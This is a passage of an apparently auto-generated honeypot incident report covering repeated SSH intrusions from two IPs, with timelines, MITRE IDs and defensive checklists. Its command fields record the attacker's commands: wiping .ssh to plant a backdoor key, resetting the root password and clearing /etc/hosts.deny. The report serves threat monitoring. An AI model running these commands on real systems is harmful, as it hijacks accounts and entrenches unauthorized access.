| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:40:52` | `cowrie.session.connect` |
| `2026-06-14 17:40:52` | `cowrie.client.version` |
| `2026-06-14 17:40:53` | `cowrie.client.kex` |
| `2026-06-14 17:40:54` | `cowrie.login.success` |
| `2026-06-14 17:40:54` | `cowrie.session.params` |
| `2026-06-14 17:40:54` | `cowrie.command.input` |
| `2026-06-14 17:40:54` | `cowrie.command.failed` |
| `2026-06-14 17:40:55` | `cowrie.log.closed` |
| `2026-06-14 17:40:55` | `cowrie.session.params` |
| `2026-06-14 17:40:55` | `cowrie.command.input` |
| `2026-06-14 17:40:55` | `cowrie.session.file_download` |
| `2026-06-14 17:40:55` | `cowrie.log.closed` |
| `2026-06-14 17:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984a3752d2ed

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:40 |
| **Last Seen** | 2026-06-14 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:40:58` | `cowrie.session.connect` |
| `2026-06-14 17:40:58` | `cowrie.client.version` |
| `2026-06-14 17:40:59` | `cowrie.client.kex` |
| `2026-06-14 17:41:00` | `cowrie.login.success` |
| `2026-06-14 17:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fb601fde557

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:42 |
| **Last Seen** | 2026-06-14 17:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:42:54` | `cowrie.session.connect` |
| `2026-06-14 17:42:54` | `cowrie.client.version` |
| `2026-06-14 17:42:54` | `cowrie.client.kex` |
| `2026-06-14 17:42:56` | `cowrie.login.success` |
| `2026-06-14 17:42:56` | `cowrie.session.params` |
| `2026-06-14 17:42:56` | `cowrie.command.input` |
| `2026-06-14 17:42:56` | `cowrie.command.failed` |
| `2026-06-14 17:42:56` | `cowrie.log.closed` |
| `2026-06-14 17:42:57` | `cowrie.session.params` |
| `2026-06-14 17:42:57` | `cowrie.command.input` |
| `2026-06-14 17:42:57` | `cowrie.session.file_download` |
| `2026-06-14 17:42:57` | `cowrie.log.closed` |
| `2026-06-14 17:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241e4317e9ba

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:43 |
| **Last Seen** | 2026-06-14 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:43:00` | `cowrie.session.connect` |
| `2026-06-14 17:43:00` | `cowrie.client.version` |
| `2026-06-14 17:43:00` | `cowrie.client.kex` |
| `2026-06-14 17:43:01` | `cowrie.login.success` |
| `2026-06-14 17:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa5d1ed33de7

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:45 |
| **Last Seen** | 2026-06-14 17:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:45:06` | `cowrie.session.connect` |
| `2026-06-14 17:45:06` | `cowrie.client.version` |
| `2026-06-14 17:45:07` | `cowrie.client.kex` |
| `2026-06-14 17:45:08` | `cowrie.login.success` |
| `2026-06-14 17:45:08` | `cowrie.session.params` |
| `2026-06-14 17:45:08` | `cowrie.command.input` |
| `2026-06-14 17:45:08` | `cowrie.command.failed` |
| `2026-06-14 17:45:09` | `cowrie.log.closed` |
| `2026-06-14 17:45:09` | `cowrie.session.params` |
| `2026-06-14 17:45:09` | `cowrie.command.input` |
| `2026-06-14 17:45:09` | `cowrie.session.file_download` |
| `2026-06-14 17:45:09` | `cowrie.log.closed` |
| `2026-06-14 17:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc8e5d9815d

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:45 |
| **Last Seen** | 2026-06-14 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:45:12` | `cowrie.session.connect` |
| `2026-06-14 17:45:12` | `cowrie.client.version` |
| `2026-06-14 17:45:13` | `cowrie.client.kex` |
| `2026-06-14 17:45:14` | `cowrie.login.success` |
| `2026-06-14 17:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8e177d709e

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:47 |
| **Last Seen** | 2026-06-14 17:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:47:18` | `cowrie.session.connect` |
| `2026-06-14 17:47:18` | `cowrie.client.version` |
| `2026-06-14 17:47:18` | `cowrie.client.kex` |
| `2026-06-14 17:47:19` | `cowrie.login.success` |
| `2026-06-14 17:47:20` | `cowrie.session.params` |
| `2026-06-14 17:47:20` | `cowrie.command.input` |
| `2026-06-14 17:47:20` | `cowrie.command.failed` |
| `2026-06-14 17:47:20` | `cowrie.log.closed` |
| `2026-06-14 17:47:20` | `cowrie.session.params` |
| `2026-06-14 17:47:20` | `cowrie.command.input` |
| `2026-06-14 17:47:21` | `cowrie.session.file_download` |
| `2026-06-14 17:47:21` | `cowrie.log.closed` |
| `2026-06-14 17:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3a81c1e4c9

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:47 |
| **Last Seen** | 2026-06-14 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:47:24` | `cowrie.session.connect` |
| `2026-06-14 17:47:24` | `cowrie.client.version` |
| `2026-06-14 17:47:24` | `cowrie.client.kex` |
| `2026-06-14 17:47:25` | `cowrie.login.success` |
| `2026-06-14 17:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637280720f23

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:50 |
| **Last Seen** | 2026-06-14 17:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:50:49` | `cowrie.session.connect` |
| `2026-06-14 17:50:49` | `cowrie.client.version` |
| `2026-06-14 17:50:49` | `cowrie.client.kex` |
| `2026-06-14 17:50:50` | `cowrie.login.success` |
| `2026-06-14 17:50:51` | `cowrie.session.params` |
| `2026-06-14 17:50:51` | `cowrie.command.input` |
| `2026-06-14 17:50:51` | `cowrie.command.failed` |
| `2026-06-14 17:50:51` | `cowrie.log.closed` |
| `2026-06-14 17:50:52` | `cowrie.session.params` |
| `2026-06-14 17:50:52` | `cowrie.command.input` |
| `2026-06-14 17:50:52` | `cowrie.session.file_download` |
| `2026-06-14 17:50:52` | `cowrie.log.closed` |
| `2026-06-14 17:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee35e5f9cbbe

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:50 |
| **Last Seen** | 2026-06-14 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:50:55` | `cowrie.session.connect` |
| `2026-06-14 17:50:55` | `cowrie.client.version` |
| `2026-06-14 17:50:55` | `cowrie.client.kex` |
| `2026-06-14 17:50:56` | `cowrie.login.success` |
| `2026-06-14 17:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47af0f3ebdaa

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:51 |
| **Last Seen** | 2026-06-14 17:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:51:37` | `cowrie.session.connect` |
| `2026-06-14 17:51:37` | `cowrie.client.version` |
| `2026-06-14 17:51:37` | `cowrie.client.kex` |
| `2026-06-14 17:51:38` | `cowrie.login.success` |
| `2026-06-14 17:51:39` | `cowrie.session.params` |
| `2026-06-14 17:51:39` | `cowrie.command.input` |
| `2026-06-14 17:51:39` | `cowrie.command.failed` |
| `2026-06-14 17:51:39` | `cowrie.log.closed` |
| `2026-06-14 17:51:40` | `cowrie.session.params` |
| `2026-06-14 17:51:40` | `cowrie.command.input` |
| `2026-06-14 17:51:40` | `cowrie.session.file_download` |
| `2026-06-14 17:51:40` | `cowrie.log.closed` |
| `2026-06-14 17:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43cddb2c79c6

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:51 |
| **Last Seen** | 2026-06-14 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:51:43` | `cowrie.session.connect` |
| `2026-06-14 17:51:43` | `cowrie.client.version` |
| `2026-06-14 17:51:43` | `cowrie.client.kex` |
| `2026-06-14 17:51:44` | `cowrie.login.success` |
| `2026-06-14 17:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed059858dae

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:53 |
| **Last Seen** | 2026-06-14 17:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:53:00` | `cowrie.session.connect` |
| `2026-06-14 17:53:00` | `cowrie.client.version` |
| `2026-06-14 17:53:00` | `cowrie.client.kex` |
| `2026-06-14 17:53:01` | `cowrie.login.success` |
| `2026-06-14 17:53:02` | `cowrie.session.params` |
| `2026-06-14 17:53:02` | `cowrie.command.input` |
| `2026-06-14 17:53:02` | `cowrie.command.failed` |
| `2026-06-14 17:53:02` | `cowrie.log.closed` |
| `2026-06-14 17:53:03` | `cowrie.session.params` |
| `2026-06-14 17:53:03` | `cowrie.command.input` |
| `2026-06-14 17:53:03` | `cowrie.session.file_download` |
| `2026-06-14 17:53:03` | `cowrie.log.closed` |
| `2026-06-14 17:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c0cf4ce1645

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:53 |
| **Last Seen** | 2026-06-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:53:06` | `cowrie.session.connect` |
| `2026-06-14 17:53:06` | `cowrie.client.version` |
| `2026-06-14 17:53:06` | `cowrie.client.kex` |
| `2026-06-14 17:53:07` | `cowrie.login.success` |
| `2026-06-14 17:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4bf3aa13ce1

| Field | Detail |
|---|---|
| **Source IP** | `120.48.135[.]189` |
| **First Seen** | 2026-06-14 18:02 |
| **Last Seen** | 2026-06-14 18:03 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZjCUNz9DLnfw"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 18:02:57` | `cowrie.session.connect` |
| `2026-06-14 18:02:57` | `cowrie.client.version` |
| `2026-06-14 18:02:57` | `cowrie.client.kex` |
| `2026-06-14 18:03:00` | `cowrie.login.success` |
| `2026-06-14 18:03:01` | `cowrie.session.params` |
| `2026-06-14 18:03:01` | `cowrie.command.input` |
| `2026-06-14 18:03:01` | `cowrie.command.failed` |
| `2026-06-14 18:03:03` | `cowrie.log.closed` |
| `2026-06-14 18:03:06` | `cowrie.session.params` |
| `2026-06-14 18:03:06` | `cowrie.command.input` |
| `2026-06-14 18:03:07` | `cowrie.session.file_download` |
| `2026-06-14 18:03:07` | `cowrie.log.closed` |
| `2026-06-14 18:03:24` | `cowrie.session.params` |
| `2026-06-14 18:03:24` | `cowrie.command.input` |
| `2026-06-14 18:03:26` | `cowrie.log.closed` |
| `2026-06-14 18:03:26` | `cowrie.session.params` |
| `2026-06-14 18:03:26` | `cowrie.command.input` |
| `2026-06-14 18:03:28` | `cowrie.log.closed` |
| `2026-06-14 18:03:30` | `cowrie.session.params` |
| `2026-06-14 18:03:30` | `cowrie.command.input` |
| `2026-06-14 18:03:30` | `cowrie.session.file_download` |
| `2026-06-14 18:03:30` | `cowrie.log.closed` |
| `2026-06-14 18:03:30` | `cowrie.session.params` |
| `2026-06-14 18:03:30` | `cowrie.command.input` |
| `2026-06-14 18:03:32` | `cowrie.log.closed` |
| `2026-06-14 18:03:32` | `cowrie.session.params` |
| `2026-06-14 18:03:32` | `cowrie.command.input` |
| `2026-06-14 18:03:33` | `cowrie.log.closed` |
| `2026-06-14 18:03:34` | `cowrie.session.params` |
| `2026-06-14 18:03:34` | `cowrie.command.input` |
| `2026-06-14 18:03:34` | `cowrie.command.input` |
| `2026-06-14 18:03:36` | `cowrie.log.closed` |
| `2026-06-14 18:03:39` | `cowrie.session.params` |
| `2026-06-14 18:03:39` | `cowrie.command.input` |
| `2026-06-14 18:03:39` | `cowrie.log.closed` |
| `2026-06-14 18:03:40` | `cowrie.session.params` |
| `2026-06-14 18:03:40` | `cowrie.command.input` |
| `2026-06-14 18:03:41` | `cowrie.log.closed` |
| `2026-06-14 18:03:41` | `cowrie.session.params` |
| `2026-06-14 18:03:41` | `cowrie.command.input` |
| `2026-06-14 18:03:42` | `cowrie.log.closed` |
| `2026-06-14 18:03:42` | `cowrie.session.params` |
| `2026-06-14 18:03:42` | `cowrie.command.input` |
| `2026-06-14 18:03:43` | `cowrie.log.closed` |
| `2026-06-14 18:03:43` | `cowrie.session.params` |
| `2026-06-14 18:03:43` | `cowrie.command.input` |
| `2026-06-14 18:03:45` | `cowrie.log.closed` |
| `2026-06-14 18:03:45` | `cowrie.session.params` |
| `2026-06-14 18:03:45` | `cowrie.command.input` |
| `2026-06-14 18:03:47` | `cowrie.log.closed` |
| `2026-06-14 18:03:47` | `cowrie.session.params` |
| `2026-06-14 18:03:47` | `cowrie.command.input` |
| `2026-06-14 18:03:49` | `cowrie.log.closed` |
| `2026-06-14 18:03:49` | `cowrie.session.params` |
| `2026-06-14 18:03:49` | `cowrie.command.input` |
| `2026-06-14 18:03:50` | `cowrie.log.closed` |
| `2026-06-14 18:03:50` | `cowrie.session.params` |
| `2026-06-14 18:03:50` | `cowrie.command.input` |
| `2026-06-14 18:03:51` | `cowrie.log.closed` |
